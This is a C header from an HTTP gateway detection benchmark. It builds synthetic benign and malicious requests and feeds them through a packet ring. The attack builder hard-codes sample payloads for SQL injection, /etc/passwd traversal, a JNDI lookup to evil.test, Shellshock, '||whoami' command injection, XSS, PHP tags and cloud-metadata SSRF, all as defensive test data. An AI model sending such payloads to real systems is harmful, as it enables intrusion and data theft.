/**
 * @file pipeline_bench_common.h
 * @brief 재조립 계열 벤치마크가 공유하는 synthetic HTTP 요청 생성 헬퍼
 */
#ifndef PIPELINE_BENCH_COMMON_H
#define PIPELINE_BENCH_COMMON_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "httgw.h"
#include "packet_ring.h"

/**
 * @brief 재조립 전용 벤치와 재조립+탐지 벤치가 동일한 입력을 쓰도록
 * synthetic HTTP 요청 원문을 생성한다.
 *
 * 요청에는 탐지 시그니처가 매치될 수 있는 URI, 헤더, body 패턴을 함께 넣어
 * 두 벤치가 동일한 payload/segment 수를 기준으로 비교되게 한다.
 *
 * @param uri_pad_len URI 내부 패딩 길이
 * @param out_len 생성된 요청 길이를 돌려받을 포인터
 * @return char* 생성된 요청 버퍼, 실패 시 NULL
 */
static inline char *build_pipeline_http_request(size_t  uri_pad_len,
                                                size_t *out_len) {
    const char *uri_prefix = "/bench?x=";
    const char *uri_suffix = "%27%20union%20select%201,2,3%20from%20dual--";
    const char *body =
        "user=admin&mode=normal&payload=%27+union+select+1,2,3+from+dual--";
    const char *hdr_a = "POST ";
    const char *hdr_b =
        " HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "User-Agent: pipeline-bench\r\n"
        "Accept: */*\r\n"
        "X-Attack: ' union select 1,2,3 from dual--\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: ";
    const char *hdr_c = "\r\nConnection: keep-alive\r\n\r\n";
    char        body_len_buf[32];
    size_t      total_len;
    char       *req;
    char       *p;
    int         n;

    if (NULL == out_len) {
        return NULL;
    }

    n = snprintf(body_len_buf, sizeof(body_len_buf), "%zu", strlen(body));
    if (n <= 0) {
        return NULL;
    }

    total_len = strlen(hdr_a) + strlen(uri_prefix) + uri_pad_len +
                strlen(uri_suffix) + strlen(hdr_b) + (size_t)n + strlen(hdr_c) +
                strlen(body);
    req = (char *)malloc(total_len + 1U);
    if (NULL == req) {
        return NULL;
    }

    p = req;
    memcpy(p, hdr_a, strlen(hdr_a));
    p += strlen(hdr_a);
    memcpy(p, uri_prefix, strlen(uri_prefix));
    p += strlen(uri_prefix);
    memset(p, 'A', uri_pad_len);
    p += uri_pad_len;
    memcpy(p, uri_suffix, strlen(uri_suffix));
    p += strlen(uri_suffix);
    memcpy(p, hdr_b, strlen(hdr_b));
    p += strlen(hdr_b);
    memcpy(p, body_len_buf, (size_t)n);
    p += n;
    memcpy(p, hdr_c, strlen(hdr_c));
    p += strlen(hdr_c);
    memcpy(p, body, strlen(body));
    p += strlen(body);
    *p = '\0';

    *out_len = total_len;
    return req;
}

static inline void bench_copy_text(char **dst, const char *src) {
    size_t len;

    if (NULL == dst || NULL == *dst || NULL == src) {
        return;
    }

    len = strlen(src);
    memcpy(*dst, src, len);
    *dst += len;
}

/**
 * @brief benign benchmark 요청의 가변 필드 값을 안전한 영숫자 패턴으로 채운다.
 *
 * 공격 시그니처와 겹칠 가능성을 낮추기 위해 특수문자 대신 제한된 문자 집합만
 * 반복 사용한다.
 *
 * @param dst 채울 버퍼
 * @param len 채울 길이
 */
static inline void fill_bench_safe_value(char *dst, size_t len) {
    static const char pattern[] = "a0b1c2d3e4f5g6h7j8k9m0n1p2q3r4t5u6v7w8x9z0";
    size_t            i;

    for (i = 0; i < len; i++) {
        dst[i] = pattern[i % (sizeof(pattern) - 1U)];
    }
}

/**
 * @brief URL, 헤더, body 길이를 각각 조절할 수 있는 benign HTTP 요청을
 * 생성한다.
 *
 * 모든 가변 데이터는 정상적인 key=value 문맥 안에만 넣고, 룰셋에 걸릴 가능성이
 * 높은 특수문자와 공격 키워드는 피한다.
 *
 * @param url_pad_len URL query value 내부 패딩 길이
 * @param header_pad_len 헤더 value 내부 패딩 길이
 * @param body_pad_len body value 내부 패딩 길이
 * @param out_len 생성된 요청 길이를 돌려받을 포인터
 * @return char* 생성된 요청 버퍼, 실패 시 NULL
 */
static inline char *build_pipeline_http_request_normal_ex(size_t url_pad_len,
                                                          size_t header_pad_len,
                                                          size_t body_pad_len,
                                                          size_t *out_len) {
    const char *url_prefix =
        "/shop/items/list?category=office&brand=acme&page=12&view=grid"
        "&bench_pad=";
    const char *url_suffix  = "&channel=online";
    const char *body_prefix = "ordernotes";
    const char *body_suffix = "complete";
    const char *hdr_a       = "POST ";
    const char *hdr_b =
        " HTTP/1.1\r\n"
        "Host: shop.example.test\r\n"
        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "Chrome/132.0.0.0 Safari/537.36\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;"
        "q=0.8\r\n"
        "Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8\r\n"
        "X-Bench-Meta: trace=";
    const char *hdr_c =
        "\r\n"
        "Content-Length: ";
    const char *hdr_d = "\r\nConnection: keep-alive\r\n\r\n";
    char        body_len_buf[32];
    size_t      body_len;
    size_t      total_len;
    char       *req;
    char       *p;
    int         n;

    if (NULL == out_len) {
        return NULL;
    }

    body_len = strlen(body_prefix) + body_pad_len + strlen(body_suffix);
    n        = snprintf(body_len_buf, sizeof(body_len_buf), "%zu", body_len);
    if (n <= 0 || (size_t)n >= sizeof(body_len_buf)) {
        return NULL;
    }

    total_len = strlen(hdr_a) + strlen(url_prefix) + url_pad_len +
                strlen(url_suffix) + strlen(hdr_b) + header_pad_len +
                strlen(hdr_c) + (size_t)n + strlen(hdr_d) + body_len;
    req = (char *)malloc(total_len + 1U);
    if (NULL == req) {
        return NULL;
    }

    p = req;
    bench_copy_text(&p, hdr_a);
    bench_copy_text(&p, url_prefix);
    fill_bench_safe_value(p, url_pad_len);
    p += url_pad_len;
    bench_copy_text(&p, url_suffix);
    bench_copy_text(&p, hdr_b);
    fill_bench_safe_value(p, header_pad_len);
    p += header_pad_len;
    bench_copy_text(&p, hdr_c);
    memcpy(p, body_len_buf, (size_t)n);
    p += n;
    bench_copy_text(&p, hdr_d);
    bench_copy_text(&p, body_prefix);
    fill_bench_safe_value(p, body_pad_len);
    p += body_pad_len;
    bench_copy_text(&p, body_suffix);
    *p = '\0';

    *out_len = total_len;
    return req;
}

/**
 * @brief 11개 공격 분류를 모두 포함하는 synthetic attack 요청을 생성한다.
 *
 * 공격 예시는 HTTP 프로토콜 이상, SQLi, RCE, XSS, PHP, Java, Generic App,
 * LFI, RFI, Session Fixation, Scanner Detection을 각각 한 번씩 포함한다.
 * 가변 길이 입력은 별도 benign pad 필드에만 추가해 크기 변화와 공격 시그니처를
 * 분리한다.
 *
 * @param url_pad_len URL query value 내부 패딩 길이
 * @param header_pad_len 헤더 value 내부 패딩 길이
 * @param body_pad_len body value 내부 패딩 길이
 * @param out_len 생성된 요청 길이를 돌려받을 포인터
 * @return char* 생성된 요청 버퍼, 실패 시 NULL
 */
static inline char *build_pipeline_http_request_attack_ex(size_t url_pad_len,
                                                          size_t header_pad_len,
                                                          size_t body_pad_len,
                                                          size_t *out_len) {
    const char *url_prefix =
        "/portal/download/../../etc/passwd"
        "?include=http://127.0.0.1/shell.txt"
        "&search=%27+union+select+1,2+from+dual--"
        "&JSESSIONID=attacksession123"
        "&java_lookup=%24%7Bjndi%3Aldap%3A%2F%2Fevil.test%2Fa%7D"
        "&bench_pad=";
    const char *url_suffix = "&channel=attack";
    const char *body_prefix =
        "product_id=BK102938"
        "&quantity=2"
        "&cmd=%7C%7Cwhoami"
        "&comment=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
        "&php_payload=%3C%3Fphp+echo+1%3B%3F%3E"
        "&java_exec=java.lang.Runtime"
        "&generic_probe=http://169.254.169.254/latest/meta-data/"
        "&path=../../etc/passwd"
        "&include=http://127.0.0.1/shell.txt"
        "&JSESSIONID=attacksession123"
        "&bench_pad=";
    const char *body_suffix = "&notes=attack-benchmark";
    const char *hdr_a       = "POST ";
    const char *hdr_b =
        " HTTP/1.1\r\n"
        "Host: shop.example.test\r\n"
        "User-Agent: sqlmap\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;"
        "q=0.8\r\n"
        "Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8\r\n"
        "Connection: keep-alive, close\r\n"
        "X-Bench-Meta: ";
    const char *hdr_c =
        "\r\n"
        "X-RCE-Probe: () { :;}; /bin/id\r\n"
        "X-PHP-Probe: <?php echo 1;?>\r\n"
        "X-Generic-Probe: http://169.254.169.254/latest/meta-data/\r\n"
        "Content-Type: application/x-www-form-urlencoded; charset=utf-8; "
        "charset=utf-8\r\n"
        "Content-Length: ";
    const char *hdr_d = "\r\n\r\n";
    char        body_len_buf[32];
    size_t      body_len;
    size_t      total_len;
    char       *req;
    char       *p;
    int         n;

    if (NULL == out_len) {
        return NULL;
    }

    body_len = strlen(body_prefix) + body_pad_len + strlen(body_suffix);
    n        = snprintf(body_len_buf, sizeof(body_len_buf), "%zu", body_len);
    if (n <= 0 || (size_t)n >= sizeof(body_len_buf)) {
        return NULL;
    }

    total_len = strlen(hdr_a) + strlen(url_prefix) + url_pad_len +
                strlen(url_suffix) + strlen(hdr_b) + header_pad_len +
                strlen(hdr_c) + (size_t)n + strlen(hdr_d) + body_len;
    req = (char *)malloc(total_len + 1U);
    if (NULL == req) {
        return NULL;
    }

    p = req;
    bench_copy_text(&p, hdr_a);
    bench_copy_text(&p, url_prefix);
    fill_bench_safe_value(p, url_pad_len);
    p += url_pad_len;
    bench_copy_text(&p, url_suffix);
    bench_copy_text(&p, hdr_b);
    fill_bench_safe_value(p, header_pad_len);
    p += header_pad_len;
    bench_copy_text(&p, hdr_c);
    memcpy(p, body_len_buf, (size_t)n);
    p += n;
    bench_copy_text(&p, hdr_d);
    bench_copy_text(&p, body_prefix);
    fill_bench_safe_value(p, body_pad_len);
    p += body_pad_len;
    bench_copy_text(&p, body_suffix);
    *p = '\0';

    *out_len = total_len;
    return req;
}

/**
 * @brief synthetic packet 하나를 ring buffer를 거쳐 httgw로 전달한다.
 *
 * 벤치마크가 ring enqueue/dequeue 오버헤드를 포함하도록, 생성한 패킷을
 * 먼저 packet_ring에 넣고 다시 꺼낸 뒤 httgw_ingest_packet()에 넘긴다.
 *
 * @param ring packet_ring 인스턴스
 * @param gw HTTP 게이트웨이 인스턴스
 * @param pkt synthetic packet 바이트 버퍼
 * @param pkt_len packet 길이
 * @param ts_ms 패킷 타임스탬프
 * @return int httgw_ingest_packet() 반환값, 실패 시 음수
 */
static inline int ingest_packet_via_ring(packet_ring_t *ring, httgw_t *gw,
                                         const uint8_t *pkt, uint32_t pkt_len,
                                         uint64_t ts_ms) {
    uint8_t  out[PACKET_MAX_BYTES];
    uint32_t out_len   = 0;
    uint64_t out_ts_ms = 0;
    int      rc;

    if (NULL == ring || NULL == gw || NULL == pkt) {
        return -1;
    }

    rc = packet_ring_enq(ring, pkt, pkt_len, ts_ms);
    if (0 != rc) {
        return -1;
    }

    rc = packet_ring_deq(ring, out, sizeof(out), &out_len, &out_ts_ms);
    if (0 != rc) {
        return -1;
    }
    if (out_len != pkt_len || out_ts_ms != ts_ms) {
        return -1;
    }

    return httgw_ingest_packet(gw, out, out_len, out_ts_ms);
}

#endif
